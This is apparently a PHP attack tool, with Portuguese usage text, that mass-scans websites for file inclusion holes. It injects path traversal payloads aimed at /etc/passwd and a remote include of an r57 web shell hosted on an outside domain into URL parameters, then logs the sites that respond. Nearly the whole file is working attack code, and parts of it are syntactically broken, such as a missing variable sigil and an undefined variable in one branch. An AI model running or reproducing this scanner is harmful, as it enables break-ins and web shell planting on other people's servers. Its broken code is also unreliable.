<?php
/*
Coded by AdeRoot 
Simples scanner LFI - RFI
Single - Massa
Greetz:
Default, Mathew, TheShow
*/
echo " _                       \n";             
echo "| |    ___  ___ __ _ _ __ \n";
echo "| |   / __|/ __/ _` | '_ \ \n";
echo "| |___\__ \ (_| (_| | | | |\n";
echo "|_____|___/\___\__,_|_| |_|\n";
echo " Coded by AdeRoot v1.0      \n\n";

if($argc == 1) {
	echo "Help parameter: | -h --help\n";
	exit(1);
}

$passwd = array("=../../../../../../../../../../../../etc/passwd",
             "=../../../../../../../../../../../../etc/passwd%00");
$rfi = "http://www.r57shell.net/shell/r57.txt?";

function help() {
  echo "Options[*]:\n\n";
  echo "DominioLFI:  | -d --dominio lfi\n";
  echo "DominioRFI:  | -r --dominio rfi\n";
  echo "ListaLFI:    | -l --lista lfi\n";
  echo "ListaRFI:    | -i --lista rfi\n\n";
  echo "LFI Single:                               RFI Single:\n\n";
	echo "Usage: php lscan.php -d xxx             | Usage: php lscan.php -r xxx\n";
	echo "Example: php lscan.php -d x/x.php?p=x   | Example: php lscan.php x/x.php?p=x\n";
	echo "-----------------------------------------------------------------------------\n";
	echo "LFI Lista:                                RFI Lista:                        \n\n";
	echo "Usage: php lscan.php -l xxx             | Usage: php lscan.php -i xxx       \n";
	echo "Example: php lscan.php -l lista.txt     | Example: php lscan.php -i lista.txt \n\n";
}

set_time_limit(0);
error_reporting(0);

$opts = getopt("hd:l:r:i:");
foreach(array_keys($opts) as $opt) switch($opt) {

          case "h":
          help();
          break;	

	  case "d":
	  $dominio = $opts["d"];
	  $valor = strpos($dominio, "=");
	  $xpt = substr($dominio, 0, $valor);
	  foreach($passwd as $passwd1) {
	  $domain = $xpt.$passwd1;
	  post($domain);
	  }
	  break;

	  case "l":
	  $lista = file_get_contents($opts["l"], "r");
	  $x = array_filter(explode("\n", $lista));
	  foreach($x as $dominio) {
	  $valor = strpos($dominio, "=");
	  $xpt = substr($dominio, 0, $valor);
	  foreach($passwd as $passwd1) {
          $domain = $xpt.$passwd1;
	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
	      post($domain);
	         }
	     }
	   }
	   break;

	  case "r";
	  $dominio = $opts["r"];
	  $valor = strpos($dominio, "=");
	  $xpt = substr($dominio, 0, $valor);
	  $domain = $xpt."=".$rfi;
	  post($domain);
	  break;

	  case "i":
	  $lista = file_get_contents($opts["i"], "r");
	  $x = array_filter(explode("\n", $lista));
	  $valor = strpos($dominio, "=");
          $xpt = substr($dominio, 0, $valor);
 	  $domain = $xpt. "=".$rfi;
	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
          post($domain);
                         }
                }
           }

    function post($domain) {
    if(preg_match("@http://@", $domain)){
          $domain = $domain;
	 } else {
       domain = "http://".$domain;
      }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $domain);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0");
    $exec = curl_exec($ch);
    curl_close($ch);
    echo $domain."=>";
    if(preg_match_all("@root:x:@", $exec) || preg_match_all("@uname@", $exec) ) {
    	echo "Found\n\n";
    	file_put_contents("lfi-rfi.txt", $domain."\r\n", FILE_APPEND);
    } else {
        echo "Not Found\n\n";
    }
  }
   if(isset($opts["d"]) || ($opts["l"]) || ($opts["r"]) || ($opts["i"])) {
   	 echo "Fim!\n";
   }
?>
